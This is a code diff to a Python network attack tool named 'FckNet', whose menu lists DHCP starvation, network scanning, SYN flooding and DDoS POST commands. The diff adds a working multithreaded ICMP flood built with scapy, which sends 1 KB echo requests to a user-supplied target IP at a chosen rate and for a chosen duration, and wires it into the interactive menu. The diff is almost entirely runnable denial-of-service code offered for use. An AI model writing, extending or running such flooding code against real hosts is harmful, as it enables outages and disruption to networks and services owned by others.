@@ -8,7 +8,7 @@ import socket
 import warnings
 import random
 import threading
-from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, srp, send, sendp, RandMAC, TCP, Raw
+from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, srp, send, sendp, RandMAC, TCP, Raw, ICMP
 import scapy.all as scapy
 import requests 
 
@@ -29,6 +29,7 @@ Here's the list of commands for Fcknet:
 - 'dhcp_starv': Perform DHCP Starvation
 - 'net_scan': Perform Network Scanning
 - 'syn_flood': Perform SYN Flooding
+- 'icmp_flood': Perform ICMP Flooding
 - 'ddos_post': Perform DDoS POST Request
 - 'help' or 'h': List all the applicable commands for FckNet
 - 'exit' or 'quit': Terminate FckNet
@@ -309,6 +310,45 @@ def start_syn_flood(target_ip, target_port, packet_rate, num_threads, duration):
     for thread in threads:
         thread.join()
 
+### ICMP Flooding ###
+def send_icmp_packets(target_ip, packet_rate, duration, stats):
+    """
+    Send ICMP Echo Request packets to a target IP to simulate an ICMP flood.
+    :param target_ip: Target IP address to flood
+    :param packet_rate: Rate of sending packets (in packets per second)
+    :param duration: Duration to send packets (in seconds)
+    :param stats: A dictionary to track the number of packets sent
+    """
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        try:
+            packet = IP(dst=target_ip) / ICMP() / Raw(b"A"*1024)
+            send(packet, verbose=0)
+            stats['packets_sent'] += 1
+            if stats['packets_sent'] % 100 == 0:
+                logging.info("Sent %d ICMP packets to %s", stats['packets_sent'], target_ip)
+            time.sleep(1 / packet_rate)
+        except KeyboardInterrupt:
+            print("Attack Interrupted.")
+            break
+
+def start_icmp_flood(target_ip, packet_rate, num_threads, duration):
+    """
+    Start ICMP flooding the target IP with Echo Requests.
+    :param target_ip: Target IP address to flood
+    :param packet_rate: Number of packets per second to send
+    :param num_threads: Number of threads to run concurrently
+    :param duration: Duration of the attack in seconds
+    """
+    stats = {'packets_sent': 0}
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_icmp_packets, args=(target_ip, packet_rate, duration, stats))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+
 ### DDoS POST ###
 def send_post_requests(url, packet_rate, packet_size, duration, stats):
     """
@@ -383,11 +423,23 @@ def main():
             display_results(devices)
         elif command == 'syn_flood':
             target_ip = input("Enter target IP for SYN Flood: ").strip()
+            if not validate_ip(target_ip):
+                print("Invalid IP address format!")
+                continue
             target_port = int(input("Enter target port for SYN Flood: ").strip())
             packet_rate = int(input("Enter packets per second: ").strip())
             threads = int(input("Enter number of threads: ").strip())
             duration = int(input("Enter duration in seconds: ").strip())
             start_syn_flood(target_ip, target_port, packet_rate, threads, duration)
+        elif command == 'icmp_flood':
+            target_ip = input("Enter target IP for ICMP Flood: ").strip()
+            if not validate_ip(target_ip):
+                print("Invalid IP address format!")
+                continue
+            packet_rate = int(input("Enter packets per second: ").strip())
+            num_threads = int(input("Enter number of threads: ").strip())
+            duration = int(input("Enter duration in seconds: ").strip())
+            start_icmp_flood(target_ip, packet_rate, num_threads, duration)
         elif command == 'ddos_post':
             url = input("Enter the target URL: ").strip()
             packet_rate = float(input("Enter packets per second: ").strip())
